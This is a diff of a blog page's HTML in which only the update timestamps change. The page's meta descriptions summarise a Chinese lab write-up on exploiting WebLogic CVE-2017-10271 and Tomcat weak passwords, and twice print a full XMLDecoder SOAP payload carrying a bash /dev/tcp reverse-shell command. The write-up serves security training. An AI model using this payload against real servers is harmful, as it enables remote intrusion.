@@ -10,7 +10,7 @@
 <meta property='og:description' content="第一次作业目标 CVE-2017-10271（利用漏洞接口写入webshell或反弹shell） Tomcat弱口令后台上传（爆破弱口令，后台部署war包拿到webshell） 配置环境 从kali官网下载针对Vmware的虚拟机压缩包后，在虚拟机目录下解压，导入至Vmware中启动，默认用户名及密码均为kali。\n在kali中安装docker.io和docker-compose，这里已经提前安装成功。\n拉取CVE-2017-10271镜像，这里也已经提前下载过，只展示启动成功的截图。\n拉取tomcat8镜像，可见两个镜像的实例都运行成功。\n进行渗透 虚拟机的ip地址为192.168.200.134，因此通过如下地址即可访问这两个服务。\nhttp://192.168.200.134:7001/\nhttp://192.168.200.134:8080/manager/html默认账户密码为tomcat:tomcat\nWebLogic/CVE-2017-10271 XMLDecoder反序列化漏洞 WebLogic/CVE-2017-10271漏洞原理 漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。\n获取基础GET包体 使用burp内嵌浏览器访问http://192.168.200.134:7001/wls-wsat/CoordinatorPortType，将数据包发送到Repeater。\n在Repeater中修改该数据包内容。即添加如下内容，同时将GET方法改为POST：\nContent-Type: text/xml Content-Length: 633 &lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt; &lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt; &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt; &lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt; &lt;void index=&#34;0&#34;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;1&#34;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;2&#34;&gt; &lt;string&gt;bash -i &gt;&amp; /dev/tcp/172.22.0.1/21 0&gt;&amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 分析xml 攻击目标：\n">
 <meta property='og:url' content='https://xingfend.github.io/xingfen-star.github.io/post/wldk-week2/'>
 <meta property='og:site_name' content='远楒'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='渗透测试' /><meta property='article:published_time' content='2025-03-04T17:23:23&#43;08:00'/><meta property='article:modified_time' content='2025-03-15T07:51:12&#43;00:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='渗透测试' /><meta property='article:published_time' content='2025-03-04T17:23:23&#43;08:00'/><meta property='article:modified_time' content='2025-03-15T07:54:22&#43;00:00'/>
 <meta name="twitter:title" content="【武大网络对抗实训/第二周】第一次作业：CVE-2017-10271与Tomcat弱口令后台上传">
 <meta name="twitter:description" content="第一次作业目标 CVE-2017-10271（利用漏洞接口写入webshell或反弹shell） Tomcat弱口令后台上传（爆破弱口令，后台部署war包拿到webshell） 配置环境 从kali官网下载针对Vmware的虚拟机压缩包后，在虚拟机目录下解压，导入至Vmware中启动，默认用户名及密码均为kali。\n在kali中安装docker.io和docker-compose，这里已经提前安装成功。\n拉取CVE-2017-10271镜像，这里也已经提前下载过，只展示启动成功的截图。\n拉取tomcat8镜像，可见两个镜像的实例都运行成功。\n进行渗透 虚拟机的ip地址为192.168.200.134，因此通过如下地址即可访问这两个服务。\nhttp://192.168.200.134:7001/\nhttp://192.168.200.134:8080/manager/html默认账户密码为tomcat:tomcat\nWebLogic/CVE-2017-10271 XMLDecoder反序列化漏洞 WebLogic/CVE-2017-10271漏洞原理 漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。\n获取基础GET包体 使用burp内嵌浏览器访问http://192.168.200.134:7001/wls-wsat/CoordinatorPortType，将数据包发送到Repeater。\n在Repeater中修改该数据包内容。即添加如下内容，同时将GET方法改为POST：\nContent-Type: text/xml Content-Length: 633 &lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt; &lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt; &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt; &lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt; &lt;void index=&#34;0&#34;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;1&#34;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&#34;2&#34;&gt; &lt;string&gt;bash -i &gt;&amp; /dev/tcp/172.22.0.1/21 0&gt;&amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 分析xml 攻击目标：\n">
     <link rel="shortcut icon" href="/xingfen-star.github.io/favicon.ico" />
@@ -353,7 +353,7 @@
 
 
                 <time>
-                    Mar 15, 2025 07:51 UTC
+                    Mar 15, 2025 07:54 UTC
                 </time>
             </div>
             <div>
@@ -714,7 +714,7 @@
 
 
         <span>
-            Last updated on Mar 15, 2025 07:51 UTC
+            Last updated on Mar 15, 2025 07:54 UTC
         </span>
     </section></footer>
 
